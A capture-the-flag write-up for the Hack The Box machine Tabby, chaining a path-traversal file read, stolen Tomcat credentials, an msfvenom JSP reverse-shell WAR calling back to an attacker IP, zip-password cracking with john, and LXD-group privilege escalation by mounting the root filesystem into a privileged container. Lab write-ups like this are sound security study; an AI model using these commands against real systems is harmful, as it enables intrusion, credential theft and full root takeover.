---
image: /assets/avatars/tabby.png
author: Valerio Casalino
title: Tabby Writeup
style: fill
color: dark
tags: [Writeups, Hackthebox]
description: <img src="/assets/avatars/tabby.png"> Writeup for Tabby (Hackthebox)
---

# Tabby

As always let's start with an `nmap` to get open ports.

![image-20201022115235445]({{ site.url }}/assets/tabby/image-20201022115235445.png)

And we got this result:

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux;protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

At this point, before starting any automated enumeration, we should take a look at the websites on port 80 and on port 8080.

![image-20201022115744210]({{ site.url }}/assets/tabby/image-20201022115744210.png)

On port 80 we can immediately see an email, which gives us a domain name. It is not really important for this machine, but a good practice in cases like this is to check for virtual hosts by adding the domain to the hosts file:

```bash
echo "\n10.10.10.194\t\tmegahosting.htb www.megahosting.htb\n" | sudo tee -a /etc/hosts
```

So, after this edit, we can connect to megahosting.htb and start looking around, until we find a curious way to include content in the news page:

```
http://megahosting.htb/news.php?file=statement
```

We can modify the request with `burp`, but seems a little overkill for this task, so we can try to trigger a directory traversal with a simple `curl` first (assuming the website is placed in `/var/www/../something`):

```bash
curl "http://www.megahosting.htb/news.php?file=../../../../etc/passwd"
```

![image-20201022131328944]({{ site.url }}/assets/tabby/image-20201022131328944.png)

We discovered the user `ash`, but, more importantly, that this location is vulnerable to a bad file inclusion that we can exploit later.

To take advantage of this vulnerability, we have to check port 8080.

![image-20201022131529012]({{ site.url }}/assets/tabby/image-20201022131529012.png)

Which gives us the initial page of tomcat and the CATALINA_HOME, in which a file named `tomcat-users.xml` contains the credentials for tomcat. The info can be retrieved with a simple Google search, [here](https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory) is the link to the article I found.

If we trigger the file inclusion on port 80 to get that file we have:

![image-20201022131953473]({{ site.url }}/assets/tabby/image-20201022131953473.png)

So we got tomcat's credentials: `tomcat:$3cureP4s5w0rd123!`.

After a little research on how to upload a `.war` file ([WAR (file format)](https://en.wikipedia.org/wiki/WAR_(file_format))), I found [this answer](https://stackoverflow.com/a/52386613) on StackOverflow, and I did made exactly that.

```bash
# First, create the war file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.51 LPORT=9001 -f war > shell.war
# Then upload it using tomcat's creds
curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://megahosting.htb:8080/manager/text/deploy?path=/lolz&update=true'
# Get ready for the reverse shell
nc -lvvp 9001
```

Now, if we go to `http://megahosting.htb:8080/lolz`, we'll trigger the reverse shell!

![image-20201022133127965]({{ site.url }}/assets/tabby/image-20201022133127965.png)

At this point, with some enumeration, we can find a backup file:

![image-20201022133555734]({{ site.url }}/assets/tabby/image-20201022133555734.png)

(I just used `find` to find all the files in the system that I could read, but that were owned by `ash`)

Let's get this backup.

```bash
wget "http://www.megahosting.htb/news.php?file=../../../../var/www/html/files/16162020_backup.zip" -O backup.zip
```

The zip file is password protected, so we'll use `john` to find it.

![image-20201022134232933]({{ site.url }}/assets/tabby/image-20201022134232933.png)

At this point, the only thing left to do is let `john` do its magic:

```bash
john --wordlist=/usr/share/wordlists/passwords/rockyou.txt for_john.txt
```

Then we get the password of the archive, which is the same as `ash`'s account, so we obtained user's credentials: `ash:admin@it`.

So, we can switch user into the box:

![image-20201022191319438]({{ site.url }}/assets/tabby/image-20201022191319438.png)

For my comfort I'll suggest to [put a pubkey](https://www.ssh.com/ssh/keygen/) into `ash`'s `~/.ssh/authorized_hosts`, or [upgrade your shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but everything will work anyway. Go in the home directory and get the flag.

Running `id`, we discovered that the user is in the `lxd`  group, so he's able to create containers and running them as `root`. If we mount the root partition inside the container we can basically be root in the box. Documentation of LXD [here](https://linuxcontainers.org/lxd/docs/master/). 

First, you have to get a container image from the [web repository](https://images.linuxcontainers.org/images/) and transfer it to the box:

```bash
# Locally
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
mv alpine-* alpine.tar.gz
python3 -m http.server
# On Tabby
a=$(mktemp -d)
cd $a
wget "http://10.10.14.51:8000/alpine.tar.gz"
lxc image import ./alpine.tar.gz --alias lolz-image
```

To run the privilege escalation you have to:

```bash
# Initialize the container and make it accessible as root
lxc init lolz-image lolz -c security.privileged=true
# Mount the root partition (/) where you want
lxc config device add lolz lolz-image disk source=/ path=/mnt/root recursive=true
# Start the container
lxc start lolz
# Get a shell inside of it
lxc exec lolz /bin/sh
```

... profit.

![image-20201022194855232]({{ site.url }}/assets/tabby/image-20201022194855232.png)
